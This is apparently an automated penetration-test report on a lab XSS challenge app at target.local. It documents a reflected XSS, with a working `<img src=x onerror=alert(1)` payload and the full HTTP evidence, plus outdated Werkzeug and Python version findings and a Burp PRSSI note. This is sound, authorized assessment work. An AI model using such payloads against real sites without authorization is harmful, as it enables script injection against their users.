# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — xss-reflected Reflected XSS via `solution` POST parameter on /page](#finding-1)
    - [2. MEDIUM — vulnerable-component Outdated Werkzeug 1.0.1 dev server — known DoS (CVE-2023-25577) and production dev-server exposure](#finding-2)
    - [3. MEDIUM — vulnerable-component End-of-life Python 2.7.18 runtime — unsupported since 2020, permanently unpatched CVEs](#finding-3)
    - [4. INFO — burp Path-relative style sheet import (2 URLs)](#finding-4)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqyrl0yd-bdrsak` |
| Target | http://target.local:32853/ |
| Started | 2026-06-29T05:15:31.745Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 2 mapped · 2 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 4 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32853`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

4 finding(s): 1 high, 2 medium, 1 info

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [xss-reflected] Reflected XSS via `solution` POST parameter on /page

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32853/

The `solution` parameter in the POST body is reflected directly into the HTML response without encoding. The server-side template places the value after a `<input>` tag and appends a literal `>`, so injecting `<img src=x onerror=alert(1)` produces the complete executable tag `<img src=x onerror=alert(1)>` in the page. The server also independently evaluates the submitted JS and reported "You did an alert with 1 instead of XSS", confirming execution. A browser rendering the response will fire the onerror handler.

**Reproduction**

```
1. POST to http://target.local:32853/page with body: solution=<img src=x onerror=alert(1)
2. Observe response contains unescaped: <img src=x onerror=alert(1)> immediately after the <input> tag.
3. The server confirms execution: "Oops! You did an alert with 1 instead of XSS".
4. Any browser rendering this response fires alert(1).
```

**Evidence**

- Evidence `ev-mqyrrq4h-c` — `artifacts/s-0002/ev-mqyrrq4h-c/`

Request:

```http
POST /page HTTP/1.1
Host: target.local:32853
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

solution=TESTMARKER123
```

Response:

```http
HTTP/1.1 200
content-length: 1018
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:20:44 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss8.css">
            <title>Dalgona - Circle</title>
        </head>
        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form" method="post">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/error_circle.png" alt="Fail" width="150" height="150"><br>Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of "XSS"</div>
                    <input type=text name=solution placeholder="Enter solution..." > TESTMARKER123>
                </form>
            </div>
        </div>
    </html>
```

- Evidence `ev-mqyrsivr-e` — `artifacts/s-0002/ev-mqyrsivr-e/`

Request:

```http
POST /page HTTP/1.1
Host: target.local:32853
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

solution=<img src=x onerror=alert(1)
```

Response:

```http
HTTP/1.1 200
content-length: 960
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:21:21 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss8.css">
            <title>Dalgona - Circle</title>
        </head>
        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form" method="post">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/error_circle.png" alt="Fail" width="150" height="150"><br>Oops! You did an alert with 1 instead of "XSS"</div>
                    <input type=text name=solution placeholder="Enter solution..." > <img src=x onerror=alert(1)>
                </form>
            </div>
        </div>
    </html>
```

- Evidence `ev-mqyrtdl4-i` — `artifacts/s-0002/ev-mqyrtdl4-i/`

Request:

```http
POST /page HTTP/1.1
Host: target.local:32853
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

solution=<img src=x onerror=alert(1)
```

Response:

```http
HTTP/1.1 200
content-length: 960
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:22:01 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss8.css">
            <title>Dalgona - Circle</title>
        </head>
        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form" method="post">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/error_circle.png" alt="Fail" width="150" height="150"><br>Oops! You did an alert with 1 instead of "XSS"</div>
                    <input type=text name=solution placeholder="Enter solution..." > <img src=x onerror=alert(1)>
                </form>
            </div>
        </div>
    </html>
```

<a id="finding-2"></a>

### 2. [MEDIUM] [vulnerable-component] Outdated Werkzeug 1.0.1 dev server — known DoS (CVE-2023-25577) and production dev-server exposure

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32853/

The server advertises `Server: Werkzeug/1.0.1 Python/2.7.18` on every HTTP response (observed via fingerprint_scan of the site root and confirmed by repeated GET / returning the "Dalgona Challenges" app). Werkzeug 1.0.1 was released 2020-03-31 and is many major versions behind current. Known vulnerabilities affecting this version: (1) CVE-2023-25577 — Werkzeug before 2.2.3 does not limit the number of multipart form parts, allowing a crafted request to exhaust CPU/memory (denial of service, CVSS 7.5); (2) CVE-2023-23934 — Werkzeug before 2.2.3 mis-parses cookies whose name contains "=", enabling cookie name/value confusion that can leak or shadow security-relevant cookies. Additionally, the banner shows the app is being served by the Werkzeug *development* WSGI server, which the project explicitly states must not be used in production; if Flask/Werkzeug debug mode is enabled, the interactive debugger exposes an arbitrary-code-execution console gated only by a brute-forceable PIN. This is a VERSION-BASED finding derived from the Server banner — it has NOT been actively exploited (no DoS/debugger probe was run, to avoid impact). The operator should confirm the exact build and whether debug mode is on before relying on it.

**Reproduction**

```
1. GET http://target.local:32853/ and inspect the response Server header → `Werkzeug/1.0.1 Python/2.7.18` (returned on every response, including 404s). 2. Cross-reference 1.0.1 against the Werkzeug changelog/advisories: CVE-2023-25577 and CVE-2023-23934 are fixed in 2.2.3, so 1.0.1 is affected. 3. Remediation: upgrade Werkzeug to a current 3.x release and deploy behind a production WSGI server (gunicorn/uWSGI) with debug mode disabled.
```

**Evidence**

- Evidence `ev-mqyrzyxr-14` — `artifacts/_/ev-mqyrzyxr-14/`

Request:

```http
GET /verdict-nonexistent-baseline-xyz HTTP/1.1
Host: target.local:32853
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
content-length: 232
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:27:08 GMT
server: Werkzeug/1.0.1 Python/2.7.18

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

- Evidence `ev-mqyrzx2z-12` — `artifacts/_/ev-mqyrzx2z-12/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32853
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1090
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:27:06 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```

- Evidence `ev-mqyrzy5x-13` — `artifacts/_/ev-mqyrzy5x-13/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32853
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1090
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:27:07 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```

<a id="finding-3"></a>

### 3. [MEDIUM] [vulnerable-component] End-of-life Python 2.7.18 runtime — unsupported since 2020, permanently unpatched CVEs

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32853/

The server banner `Server: Werkzeug/1.0.1 Python/2.7.18` (observed via fingerprint_scan of the root and reproduced on repeated GET /) reveals the application runs on Python 2.7.18. Python 2.7 reached End-of-Life on 2020-01-01 and 2.7.18 (released 2020-04-20) is the final upstream release ever — no security patches have been or will be issued. As a result the runtime is permanently exposed to CVEs disclosed after EOL, e.g.: CVE-2021-3177 (buffer overflow in PyCArg_repr / ctypes — patched in 3.6.13/3.7.10/3.8.8/3.9.2 but never in upstream 2.7); CVE-2021-23336 (web cache poisoning / parameter cloaking via urllib.parse semicolon separator); CVE-2022-0391 (URL parsing control-character injection in urllib.parse). These were fixed in maintained Python 3.x but remain unpatched in upstream 2.7.x. This is a VERSION/EOL-BASED finding from the Server banner — not actively exploited; concrete exploitability depends on which stdlib paths the app uses (the listed CVEs require the app to parse attacker-controlled ctypes args / URLs). Treat the unsupported runtime itself as the core risk.

**Reproduction**

```
1. GET http://target.local:32853/ and read the Server header → `... Python/2.7.18`. 2. Note Python 2.7 EOL date 2020-01-01 and that 2.7.18 is the last release — any post-2020 CVE is unpatched upstream (e.g. CVE-2021-3177, CVE-2021-23336, CVE-2022-0391). 3. Remediation: migrate the application to a supported Python 3.x (3.11+) runtime.
```

**Evidence**

- Evidence `ev-mqyrzyxr-14` — `artifacts/_/ev-mqyrzyxr-14/`

Request:

```http
GET /verdict-nonexistent-baseline-xyz HTTP/1.1
Host: target.local:32853
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
content-length: 232
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:27:08 GMT
server: Werkzeug/1.0.1 Python/2.7.18

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

- Evidence `ev-mqyrzx2z-12` — `artifacts/_/ev-mqyrzx2z-12/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32853
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1090
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:27:06 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```

- Evidence `ev-mqyrzy5x-13` — `artifacts/_/ev-mqyrzy5x-13/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32853
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1090
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:27:07 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```

<a id="finding-4"></a>

### 4. [INFO] [burp] Path-relative style sheet import (2 URLs)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this techniqu [+1 more URL(s): http://target.local:32853/page] @ http://target.local:32853/

**Reproduction**

```
Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。
```

**Evidence**

- Evidence `ev-mqys3sp5-15` — `artifacts/_/ev-mqys3sp5-15/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32853

GET / HTTP/1.1
Host: target.local:32853
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1090
Server: Werkzeug/1.0.1 Python/2.7.18
Date: Mon, 29 Jun 2026 05:27:57 GMT


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```
